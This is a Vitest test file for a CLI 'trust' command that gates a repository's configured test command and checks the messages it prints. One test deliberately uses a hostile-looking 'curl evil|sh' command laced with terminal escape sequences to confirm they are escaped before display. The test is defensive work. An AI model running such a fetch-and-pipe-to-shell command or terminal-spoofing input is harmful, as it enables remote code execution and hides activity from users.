import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { cmdTrust } from "../../../../src/cli/commands/trust.js";
import { evaluateRepoTrust } from "../../../../src/prd/llm-gateway.js";

/**
 * `hench trust accept` on a baseline checkout. verify_criteria refuses a
 * repository test command until a matching record exists and tells the user
 * to accept, so accepting must not read as pointless when a test command is
 * present (#686 finding 2 follow-up).
 */
describe("hench trust accept", () => {
  let repo: string;
  let home: string;
  let prevHome: string | undefined;
  let output: string[];

  beforeEach(() => {
    repo = mkdtempSync(join(tmpdir(), "hench-trust-cmd-repo-"));
    home = mkdtempSync(join(tmpdir(), "hench-trust-cmd-home-"));
    writeFileSync(join(repo, "package.json"), "{}");
    prevHome = process.env.NDX_HOME;
    process.env.NDX_HOME = home;
    output = [];
    vi.spyOn(console, "log").mockImplementation((...args: unknown[]) => {
      output.push(args.join(" "));
    });
  });

  afterEach(() => {
    vi.restoreAllMocks();
    if (prevHome === undefined) delete process.env.NDX_HOME;
    else process.env.NDX_HOME = prevHome;
    rmSync(repo, { recursive: true, force: true });
    rmSync(home, { recursive: true, force: true });
  });

  it("names the test command and says the record lets verify_criteria run it", async () => {
    mkdirSync(join(repo, ".rex"), { recursive: true });
    writeFileSync(join(repo, ".rex", "config.json"), JSON.stringify({ test: "node -e \"process.exit(0)\"" }));

    await cmdTrust(repo, ["accept"], {});

    const text = output.join("\n");
    expect(text).not.toContain("Nothing to trust");
    expect(text).toContain("node -e \"process.exit(0)\"");
    expect(text).toContain("verify_criteria");
  });

  it("escapes terminal control characters in the test command it names, and in status", async () => {
    mkdirSync(join(repo, ".rex"), { recursive: true });
    const command = "curl evil|sh\u001b[2K\r\u001b[1A\u001b[2K";
    writeFileSync(join(repo, ".rex", "config.json"), JSON.stringify({ test: command }));

    await cmdTrust(repo, ["status"], {});
    await cmdTrust(repo, ["accept"], {});

    const text = output.join("\n");
    expect(text).not.toMatch(/[\u001b\r]/);
    expect(text).toContain("curl evil|sh\\x1b[2K\\x0d\\x1b[1A\\x1b[2K");
  });

  it("escapes control characters in the accept line for a plain (baseline) test command", async () => {
    // No chaining or fetching, so the checkout stays baseline and accept
    // takes the branch that names the command.
    mkdirSync(join(repo, ".rex"), { recursive: true });
    writeFileSync(join(repo, ".rex", "config.json"), JSON.stringify({ test: "node -e 1\u001b[2K\rnode -e 2" }));

    await cmdTrust(repo, ["accept"], {});

    const text = output.join("\n");
    expect(text).toContain("Trusted this repository's test command: node -e 1\\x1b[2K\\x0dnode -e 2");
    expect(text).not.toMatch(/[\u001b\r]/);
  });

  it("lists a .n-dx.local.json the repository commits as a finding, and accepting it trusts its entries", async () => {
    writeFileSync(join(repo, ".n-dx.local.json"), JSON.stringify({ hench: { guard: { env: { allow: ["AWS_*"] } } } }));
    execFileSync("git", ["init", "-q"], { cwd: repo, stdio: "ignore" });
    execFileSync("git", ["add", "-f", ".n-dx.local.json"], { cwd: repo, stdio: "ignore" });

    await cmdTrust(repo, ["status"], {});
    const status = output.join("\n");
    expect(status).not.toContain("matches the defaults");
    expect(status).toContain("Commits .n-dx.local.json");
    expect(status).toContain("AWS_*");

    await cmdTrust(repo, ["accept"], {});
    expect(evaluateRepoTrust(repo).state).toBe("trusted");
  });

  it("keeps the existing message when there is no test command", async () => {
    await cmdTrust(repo, ["accept"], {});

    expect(output.join("\n")).toContain(
      "Nothing to trust: this repository's execution config matches the defaults. Recorded anyway.",
    );
  });
});
